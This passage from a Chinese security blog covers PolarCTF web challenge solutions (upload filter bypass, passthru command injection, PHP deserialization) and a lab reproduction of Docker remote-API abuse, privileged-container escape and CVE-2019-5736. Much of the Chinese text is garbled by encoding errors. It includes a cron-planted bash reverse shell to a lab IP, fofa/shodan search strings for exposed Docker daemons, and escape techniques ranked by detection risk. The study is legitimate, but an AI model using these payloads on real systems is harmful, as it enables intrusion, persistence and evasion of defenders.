alt="image-20240117211315535"></p><h5 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.rand(<span class="number">10000</span>,<span class="number">99999</span>).<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å³é”®æºä»£ç ç»™äº†æºç ï¼Œæ›¿æ¢åˆ—è¡¨ä¸­åç¼€ï¼ŒåŒå†™ç»•è¿‡å³å¯ï¼Œasdasd.pphphp</p><h5 id="cool"><a href="#cool" class="headerlink" title="cool"></a>cool</h5><p><code>http://0652266e-ee52-43a0-b00b-d0a54e66a193.www.polarctf.com:8090/?a=passthru(&#39;cat fla*&#39;);</code></p><h5 id="phpurl"><a href="#phpurl" class="headerlink" title="phpurl"></a>phpurl</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;xxs&quot;</span>===<span class="variable">$_GET</span>[sys]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;Not a good idea!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[sys] = urldecode(<span class="variable">$_GET</span>[sys]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[sys] == <span class="string">&quot;xxs&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to polar LABS!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Flag: XXXXXXX &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/polarctf/image-20240117210721767.png" alt="image-20240117210721767"></p><p><code>http://809e69b5-b363-456e-a92e-7f6388b058ca.www.polarctf.com:8090/index.php?sys=%25%37%38%25%37%38%25%37%33</code><br>é»˜è®¤ä¼ å‚çš„æ—¶å€™ä¼ é€’çš„å€¼ä¼šè§£ç ä¸€æ¬¡ï¼Œè€Œé¢˜ç›®åˆè§£ç äº†ä¸€æ¬¡ï¼Œæ‰€ä»¥å°†xxsç¼–ç ä¸¤æ¬¡</p><p><img src="/images/polarctf/image-20240118084615748.png" alt="image-20240118084615748"></p><h5 id="ä½ çš„é©¬å‘¢ï¼Ÿ"><a href="#ä½ çš„é©¬å‘¢ï¼Ÿ" class="headerlink" title="ä½ çš„é©¬å‘¢ï¼Ÿ"></a>ä½ çš„é©¬å‘¢ï¼Ÿ</h5><p>å›¾ç‰‡é©¬+æ–‡ä»¶åŒ…å«</p><h5 id="éšæœºå€¼"><a href="#éšæœºå€¼" class="headerlink" title="éšæœºå€¼"></a>éšæœºå€¼</h5><p>ç»™äº†æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Polar1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Polar2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Night</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Light</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"><span class="variable">$flag</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Polar2</span> = rand(<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;Polar1 === <span class="keyword">$this</span>-&gt;Polar2)&#123;</span><br><span class="line">            <span class="variable">$Light</span> = rand(<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;Night === <span class="keyword">$this</span>-&gt;Light)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Your wrong!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]);</span><br><span class="line">    <span class="variable">$a</span>-&gt;getflag(<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡ŒPolar1ç­‰äºPolar2 Night=Light  éšæœº100ï¼Œå› ä¸ºæ¯æ¬¡è¯·æ±‚å€¼éƒ½æ˜¯ä¼šå˜å¾—ã€‚æ‰€ä»¥å¹¶ä¸æ˜¯100*100çš„å¯èƒ½æ€§ï¼Œè€Œæ˜¯æ¯”è¿™å¯èƒ½æ€§å°çš„å¤š<br>æ‰€ä»¥è¿˜æ˜¯å¼•ç”¨å˜é‡è¦†ç›–,è¿™é‡Œè¦æŠŠå±æ€§è®¾ç½®ä¸ºpublicã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Polar1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Polar2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Night</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Light</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"><span class="variable">$flag</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Polar2</span> = rand(<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$Polar2</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;-----&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;Polar1 === <span class="keyword">$this</span>-&gt;Polar2)&#123;</span><br><span class="line">            <span class="variable">$Light</span> = rand(<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$Light</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;Night === <span class="keyword">$this</span>-&gt;Light)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Your wrong!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]);</span><br><span class="line">    <span class="variable">$a</span>-&gt;getflag(<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="string">&quot;suiji.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;----------------&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Index();</span><br><span class="line"><span class="variable">$a</span>-&gt;Polar1=&amp;<span class="variable">$a</span>-&gt;Polar2;</span><br><span class="line"><span class="variable">$a</span>-&gt;Night=&amp;<span class="variable">$a</span>-&gt;Light;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>k8så­¦ä¹ åŠæ¼æ´å¤ç°-ä¸‹</title>
      <link href="/2024/01/10/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E4%B8%8B/"/>
      <url>/2024/01/10/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E4%B8%8B/</url>
      
        <content type="html"><![CDATA[<h6 id="1-1docker-remote-api-2375"><a href="#1-1docker-remote-api-2375" class="headerlink" title="1.1docker remote api (2375)"></a>1.1docker remote api (2375)</h6><p>k8sä¸dockeræ€»æ˜¯å¹¶è¡Œå‡ºç°çš„ï¼Œé‚£ä¹ˆå¦‚æœdockerå‡ºç°é—®é¢˜ï¼Œä¹Ÿå°†æ˜¯ä¸¥é‡çš„ã€‚è¿™é‡Œç¬”è€…å­¦ä¹ å¤ç°ä¸€ä¸‹dockerçš„æ¼æ´ï¼Œdockerè¿œç¨‹è®¿é—®æ¼æ´ã€‚<br><code>fofaæŒ‡çº¹app=&quot;docker-Daemon&quot; shodan **port:â€2375â€³ country:â€JPâ€ Docker**</code><br>æµ‹è¯•æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œfofaå‡ºæ¥çš„å¹¶ä¸æ˜¯éƒ½æ˜¯2375ç«¯å£ï¼Œä¹Ÿå¯èƒ½æ˜¯é™„è¿‘çš„ï¼Œéƒ½ä¸€æ ·ï¼Œæ­£å¸¸æ˜¯404ï¼Œç„¶ååŠ ä¸ªversionï¼Œæˆ–è€…<code>2376/containers/json</code>å‡ºç°ä¿¡æ¯ï¼Œä¹Ÿå¯è¯æ˜å­˜åœ¨æ¼æ´<br><img src="/images/k8s/image-20240111103740807.png" alt="image-20240111103740807"></p><p><img src="/images/k8s/image-20240111103917111.png" alt="image-20240111103917111"></p><p><img src="/images/k8s/image-20240111104146653.png" alt="image-20240111104146653"></p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨å‘½ä»¤è¿›è¡Œè·å–åˆ°ç›¸å…³å®¹å™¨ã€‚</p><p><img src="/images/k8s/image-20240111141859943.png" alt="image-20240111141859943"></p><h6 id="1-2æ­å»ºæœ¬åœ°æ¼æ´"><a href="#1-2æ­å»ºæœ¬åœ°æ¼æ´" class="headerlink" title="1.2æ­å»ºæœ¬åœ°æ¼æ´"></a>1.2æ­å»ºæœ¬åœ°æ¼æ´</h6><p>æ¥ä¸‹æ¥çš„æ“ä½œæ²¡æœ‰æˆæƒï¼Œå°±æ­å»ºäº†ä¸€ä¸ªç¯å¢ƒï¼Œä½¿ç”¨vulhubæ­å»ºï¼Œå¾ˆæ–¹ä¾¿ã€‚<code>https://github.com/vulhub/vulhub</code>ï¼Œå®‰è£…å®Œdockerå³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /vulhub/docker/unauthorized-rce</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬pullä¸€ä¸ªé•œåƒï¼Œè¿™é‡ŒæŠ¥äº†ä¸€ä¸ªé”™ï¼ŒUsing default tag: latest<br>Error response from daemon: missing signature keyï¼Œå¤§æ¦‚æ„æ€æ˜¯æœ¬æœºdockerç‰ˆæœ¬ä½æˆ–è€…é«˜ï¼Œé•œåƒç‰ˆæœ¬ä½æˆ–è€…é«˜ï¼Œç„¶åé•œåƒå’Œdockerä¸åŒ¹é…ä¸å…¼å®¹ï¼Œé‚£ä¹ˆå¾ˆå¥½è§£å†³ï¼Œç®€å•è§£å†³æ–¹æ³•å»hub.docker.comï¼Œæœä¸€ä¸‹é•œåƒï¼Œç„¶åæ‹‰å»ä½ç‰ˆæœ¬çš„ï¼Œå¤æ‚çš„ï¼Œæ›´æ–°dockerã€‚</p><h6 id="1-3åˆ©ç”¨è¿‡ç¨‹"><a href="#1-3åˆ©ç”¨è¿‡ç¨‹" class="headerlink" title="1.3åˆ©ç”¨è¿‡ç¨‹"></a>1.3åˆ©ç”¨è¿‡ç¨‹</h6><p><img src="/images/k8s/image-20240111143119711.png" alt="image-20240111143119711"></p><p><img src="/images/k8s/image-20240111143520435.png" alt="image-20240111143520435"></p><p><img src="/images/k8s/image-20240111143543713.png" alt="image-20240111143543713"></p><p>åŠ ä¸Šç‰ˆæœ¬å·åœ¨pullå³å¯ï¼Œè¿™é‡Œä¸ä¸€å®šå¿…é¡»è¦æ‹‰è¿™ä¸ªï¼Œå…¶ä»–çš„ä¹Ÿä¸€æ ·ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://192.168.241.142:2375 run -it --privileged busybox:1.27.0  /bin/sh</span><br><span class="line"></span><br><span class="line">#åœ¨kaliä¸­å¯åŠ¨ä¸€ä¸ªæœ‰äº¤äº’çš„shellï¼Œå¹¶ä¸”æ˜¯ç‰¹æƒé•œåƒ</span><br><span class="line">#å½“æ“ä½œè€…æ‰§è¡Œdocker run â€”privilegedæ—¶ï¼ŒDockerå°†å…è®¸å®¹å™¨è®¿é—®å®¿ä¸»æœºä¸Šçš„æ‰€æœ‰è®¾å¤‡ï¼ŒåŒæ—¶ä¿®æ”¹AppArmoræˆ–SELinuxçš„é…ç½®ï¼Œä½¿å®¹å™¨æ‹¥æœ‰ä¸é‚£äº›ç›´æ¥è¿è¡Œåœ¨å®¿ä¸»æœºä¸Šçš„è¿›ç¨‹å‡ ä¹ç›¸åŒçš„è®¿é—®æƒé™ã€‚</span><br><span class="line">ä¹Ÿå°±æ˜¯å¸¸è¯´çš„ç‰¹æƒæ¨¡å¼ã€‚</span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20240111144005712.png" alt="image-20240111144005712"></p><h6 id="1-4ç‰¹æƒæ¨¡å¼é€ƒé€¸"><a href="#1-4ç‰¹æƒæ¨¡å¼é€ƒé€¸" class="headerlink" title="1.4ç‰¹æƒæ¨¡å¼é€ƒé€¸"></a>1.4ç‰¹æƒæ¨¡å¼é€ƒé€¸</h6><p>ç„¶ååœ¨è¿›è¡Œé€ƒé€¸å³å¯ã€‚æœ€ç®€å•çš„ï¼ŒæŒ‚è½½ä¸»æœºç¡¬ç›˜ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># mkdir bohemian</span></span><br><span class="line">/ <span class="comment"># mount /dev/vda1 /bohemian</span></span><br><span class="line">/ <span class="comment"># ls /bohemian</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment">#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span></span><br><span class="line">bash -c <span class="string">&quot;bash -i  &gt;&amp;/dev/tcp/192.168.241.128/6666 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chmod +x s.sh </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;*/1 * * * *  /bohemian/s.sh&#x27;</span> &gt;&gt; /bohemian/var/spool/cron/crontabs/root <span class="comment">#æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æˆ–è€…passwdå†™ç”¨æˆ·ä¹Ÿæ˜¯å¸¸è§çš„å†™åé—¨çš„ä¸€ç§æ–¹æ³•</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å€¼å¾—ä¸€æçš„æ˜¯</span><br><span class="line"></span><br><span class="line">ä»å¯¹æŠ—çš„å±‚é¢ä¸Šï¼Œä¸å»ºè®®å°†é€ƒé€¸çš„è¡Œä¸ºå½“æˆå¯ä»¥å†™å…¥å®¿ä¸»æœºç‰¹å®šæ–‡ä»¶ (å¦‚ /etc/cron*, /root/.ssh/authorized_keys ç­‰æ–‡ä»¶) çš„è¡Œä¸ºï¼Œåº”è¯¥æ ¹æ®ç›®æ ‡é€‰æ‹©æ›´è¶‹è¿‘ä¸ä¸šåŠ¡è¡Œä¸ºçš„æ‰‹æ³•ï¼Œå®¹å™¨é€ƒé€¸çš„åˆ©ç”¨æ‰‹æ®µä¼šæ¯”å¤§éƒ¨åˆ†æƒ…å†µä¸‹çš„å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨è¦çµæ´»ã€‚</span><br><span class="line"></span><br><span class="line">ä»¥ç›®æ ‡ â€œè·å–å®¿ä¸»æœºä¸Šçš„é…ç½®æ–‡ä»¶â€ ä¸ºä¾‹ï¼Œä»¥ä¸‹å‡ ç§é€ƒé€¸æ‰‹æ³•åœ¨å®¹æ˜“åœ¨é˜²å¾¡å›¢é˜Ÿä¸­æš´éœ²çš„æ¦‚ç‡ä»å¤§åˆ°å°ï¼Œæ’åºå¦‚ä¸‹(éƒ¨åˆ†å…¸å‹æ‰‹æ³•ä¸¾ä¾‹ï¼Œä¸åŒçš„ EDR æƒ…å†µä¸åŒ)ï¼š</span><br><span class="line"></span><br><span class="line">mount /etc + write crontab</span><br><span class="line">mount /root/.ssh + write authorized_keys</span><br><span class="line">old CVE/vulnerability exploit</span><br><span class="line">write cgroup notify_on_release</span><br><span class="line">write procfs core_pattern</span><br><span class="line">volumeMounts: / + chroot</span><br><span class="line">remount and rewrite cgroup</span><br><span class="line">websocket/sock shell + volumeMounts: /path</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20240111144206581.png" alt="image-20240111144206581"></p><p><img src="/images/k8s/image-20240111150221566.png" alt="image-20240111150221566"></p><h6 id="1-6æ€»ç»“ï¼š"><a href="#1-6æ€»ç»“ï¼š" class="headerlink" title="1.6æ€»ç»“ï¼š"></a>1.6æ€»ç»“ï¼š</h6><p>ä¸ªäººæ„Ÿè§‰åœ¨å®æˆ˜ä¸­ï¼Œè¿™ä¸ªæœªæˆæƒå‡ºç°çš„ä¸å¤šäº†ï¼Œfofaåï¼Œè®¿é—®äº†å‡ ä¸ª20ä¸ªæ„Ÿè§‰æœ‰äº”ä¸ªå·¦å³ã€‚</p><h5 id="2-docker-runCå®¹å™¨é€ƒé€¸-CVE-2019-5736å¤ç°"><a href="#2-docker-runCå®¹å™¨é€ƒé€¸-CVE-2019-5736å¤ç°" class="headerlink" title="2.docker:runCå®¹å™¨é€ƒé€¸-CVE-2019-5736å¤ç°"></a>2.<strong>docker:runCå®¹å™¨é€ƒé€¸-CVE-2019-5736å¤ç°</strong></h5><h6 id="2-1æ¼æ´åŸç†"><a href="#2-1æ¼æ´åŸç†" class="headerlink" title="2.1æ¼æ´åŸç†"></a>2.1æ¼æ´åŸç†</h6><p>æ¼æ´ç‚¹åœ¨äºrunCï¼ŒRunCæ˜¯ä¸€ä¸ªå®¹å™¨è¿è¡Œæ—¶ï¼Œæœ€åˆæ˜¯ä½œä¸ºDockerçš„ä¸€éƒ¨åˆ†å¼€å‘çš„ï¼Œåæ¥ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„å¼€æºå·¥å…·å’Œåº“è¢«æå–å‡ºæ¥ã€‚ä½œä¸ºâ€œä½çº§åˆ«â€å®¹å™¨è¿è¡Œæ—¶ï¼ŒrunCä¸»è¦ç”±â€œé«˜çº§åˆ«â€å®¹å™¨è¿è¡Œæ—¶ï¼ˆä¾‹å¦‚Dockerï¼‰ç”¨äºç”Ÿæˆå’Œè¿è¡Œå®¹å™¨ï¼Œå°½ç®¡å®ƒå¯ä»¥ç”¨ä½œç‹¬ç«‹å·¥å…·ã€‚åƒDockerè¿™æ ·çš„â€œé«˜çº§åˆ«â€å®¹å™¨è¿è¡Œæ—¶é€šå¸¸ä¼šå®ç°é•œåƒåˆ›å»ºå’Œç®¡ç†ç­‰åŠŸèƒ½ï¼Œå¹¶ä¸”å¯ä»¥ä½¿ç”¨runCæ¥å¤„ç†ä¸è¿è¡Œå®¹å™¨ç›¸å…³çš„ä»»åŠ¡ï¼šåˆ›å»ºå®¹å™¨ã€å°†è¿›ç¨‹é™„åŠ åˆ°ç°æœ‰å®¹å™¨ç­‰ã€‚åœ¨Docker 18.09.2ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ä½¿ç”¨äº†çš„runcç‰ˆæœ¬å°äº1.0-rc6ï¼Œå› æ­¤å…è®¸æ”»å‡»è€…é‡å†™å®¿ä¸»æœºä¸Šçš„runc äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨å®¿ä¸»æœºä¸Šä»¥rootèº«ä»½æ‰§è¡Œå‘½ä»¤ã€‚</p><h6 id="2-2ç¯å¢ƒéƒ¨ç½²"><a href="#2-2ç¯å¢ƒéƒ¨ç½²" class="headerlink" title="2.2ç¯å¢ƒéƒ¨ç½²"></a>2.2ç¯å¢ƒéƒ¨ç½²</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./metarget cnv install cve-2019-5736</span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20240112143301977.png" alt="image-20240112143301977"></p><h6 id="2-3æ¼æ´å½±å“ç‰ˆæœ¬"><a href="#2-3æ¼æ´å½±å“ç‰ˆæœ¬" class="headerlink" title="2.3æ¼æ´å½±å“ç‰ˆæœ¬"></a>2.3æ¼æ´å½±å“ç‰ˆæœ¬</h6><ul><li><p>runC &lt; 1.0-rc6 ï¼ˆdocker &lt; 18.09.2ï¼‰</p></li><li><p><img src="/images/k8s/image-20240112144834221.png" alt="image-20240112144834221"></p></li></ul><h6 id="2-4åˆ©ç”¨æ¡ä»¶"><a href="#2-4åˆ©ç”¨æ¡ä»¶" class="headerlink" title="2.4åˆ©ç”¨æ¡ä»¶"></a>2.4åˆ©ç”¨æ¡ä»¶</h6><p>éœ€è¦åœ¨å®¹å™¨å†…å…·æœ‰ root æƒé™ï¼Œæ‰èƒ½è¦†ç›–runCæ–‡ä»¶ï¼Œå¯èƒ½éœ€è¦é…åˆé’“é±¼ç­‰ç­‰æ‰‹æ³•ï¼Œè®©å¯¹é¢çš„ç®¡ç†å‘˜æ‰§è¡Œå‘½ä»¤è¿›å…¥å®¹å™¨ï¼Œä¹Ÿå°±æ˜¯<code>docker run -it ubuntu 